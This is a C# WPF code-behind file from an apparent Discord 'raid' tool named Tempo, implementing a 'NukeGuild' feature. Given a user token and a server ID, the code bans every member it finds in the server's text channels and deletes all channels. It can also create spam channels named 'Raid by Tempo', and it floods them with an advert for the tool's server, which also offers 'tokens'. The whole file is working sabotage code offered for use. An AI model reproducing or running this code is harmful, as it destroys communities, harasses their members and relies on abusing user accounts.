using Discord;
using Discord.Gateway;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace TempoWithGUI.MVVM.View.RaidView
{
    /// <summary>
    /// Interaction logic for NukeGuild.xaml
    /// </summary>
    public partial class NukeGuild : UserControl
    {
        public bool nuking { get; set; }
        public NukeGuild()
        {
            InitializeComponent();
        }

        private void RoomsCB_Click(object sender, RoutedEventArgs e)
        {
            if ((bool)RoomsCB.IsChecked)
            {
                PadButtons.Visibility = Visibility.Collapsed;
                MessageIn.Visibility = Visibility.Visible;
                MessageLabel.Visibility = Visibility.Visible;
            }
            else
            {
                PadButtons.Visibility = Visibility.Hidden;
                MessageIn.Visibility = Visibility.Collapsed;
                MessageLabel.Visibility = Visibility.Collapsed;
            }
        }
        private void Start_Click(object sender, RoutedEventArgs e)
        {
            if (nuking)
                return;
            StartBtn.Cursor = Cursors.AppStarting;
            bool banAll = (bool)BanCB.IsChecked;
            bool createRooms = (bool)RoomsCB.IsChecked;
            string message = MessageIn.Text;
            if(message == null || message == "")
            {
                message = "Raid by Tempo, come check out our raid tool in our official server https://discord.gg/MmRySc7xb9";
            }

            var guildId = GuildIn.Text;
            var token = TokenIn.Text;

            ulong guild_id = 0;
            if (!ulong.TryParse(guildId, out guild_id))
            {
                StartBtn.Cursor = Cursors.Arrow;
                return;
            }
            DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig()
            {
                ApiVersion = 9,
                RetryOnRateLimit = true,
                HandleIncomingMediaData = false
            });

            StatusLight.Fill = Brushes.Green;
            StartBtn.Cursor = Cursors.Arrow;

            Thread nuke = new Thread(() =>
            {
                try
                {
                    client.Login(token);
                }
                catch
                {
                    MessageBox.Show("Please use a valid user token!");
                    return;
                }
                var guild = client.GetGuild(guild_id);
                var channels = guild.GetChannels();

                bool bannedAll = false;
                if (banAll)
                {
                    for(int i = 0; i < channels.Count; i++)
                    {
                        Task.Run(() =>
                        {
                            var o = i;
                            try
                            {
                                if (!channels[o].IsText)
                                    return;
                                var members = client.GetGuildChannelMembers(guild_id, channels[o].Id);
                                foreach (var member in members)
                                {
                                    try
                                    {
                                        client.BanGuildMember(guild_id, member.User.Id, message);
                                    }
                                    catch (Exception ex) { continue; }
                                }
                                if(o == channels.Count - 1)
                                {
                                    bannedAll = true;
                                }
                            }
                            catch (Exception ex) { return; }
                        });
                        Thread.Sleep(500);
                    }
                }
                var new_channels = new List<GuildChannel>() { };
                foreach(var channel in channels)
                {
                    try
                    {
                        channel.Delete();
                        if(createRooms)
                            new_channels.Add(guild.CreateChannel("Raid by Tempo", ChannelType.Text));
                    }
                    catch (Exception ex) { }
                }
                foreach(var ch in new_channels)
                {
                    if (message != "" && message != null)
                        client.SendMessage(ch.Id, message);
                    else
                        client.SendMessage(ch.Id, "Raid by Tempo. Come check out our tool and tokens in the official server --> https://discord.gg/MmRySc7xb9");
                }

                while (!bannedAll)
                    Thread.Sleep(1000);
                Dispatcher.Invoke(() => Set_Light(false));
                nuking = false;
            });
            nuke.Start();
        }
        private void Stop_Click(object sender, RoutedEventArgs e)
        {
            StatusLight.Fill = Brushes.Red;
            nuking = false;
        }
        private void Set_Light(bool status)
        {
            if (status)
            {
                StatusLight.Fill = Brushes.Green;
            }
            else
            {
                StatusLight.Fill = Brushes.Red;
            }
        }
    }
}
